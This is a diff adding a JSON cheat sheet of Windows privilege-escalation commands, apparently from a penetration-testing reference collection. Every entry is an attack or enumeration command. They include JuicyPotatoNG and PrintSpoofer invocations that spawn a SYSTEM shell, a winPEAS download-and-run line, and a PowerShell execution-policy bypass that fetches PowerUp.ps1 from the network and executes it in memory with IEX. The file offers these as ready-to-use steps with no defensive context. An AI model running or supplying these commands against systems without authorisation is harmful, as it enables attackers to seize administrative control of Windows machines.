@@ -1,0 +1,13 @@
+{
+  "category": "Privilege Escalation – Windows",
+  "description": "JuicyPotato, PrintSpoofer, unquoted path etc.",
+  "cheats": [
+    { "title": "System info quick", "content": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"" },
+    { "title": "Unquoted service path scan", "content": "wmic service get name,displayname,pathname,startmode | findstr /I \"AUTO\" | findstr /I /V \"C:\\\\Windows\" | findstr /I /V '\"'" },
+    { "title": "AlwaysInstallElevated MSI", "content": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated" },
+    { "title": "JuicyPotatoNG (CLSID example)", "content": "JuicyPotatoNG.exe -t * -p cmd.exe -l 1337 -c {12345678-1234-1234-1234-123456789ABC}" },
+    { "title": "PrintSpoofer (no Defender)", "content": "PrintSpoofer.exe -i -c cmd" },
+    { "title": "winPEAS download & run", "content": "powershell \"irm https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -OutFile winpeas.exe\" && .\\winpeas.exe" },
+    { "title": "PowerUp", "content": "powershell -ep bypass \"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');Invoke-AllChecks\"" }
+  ]
+}
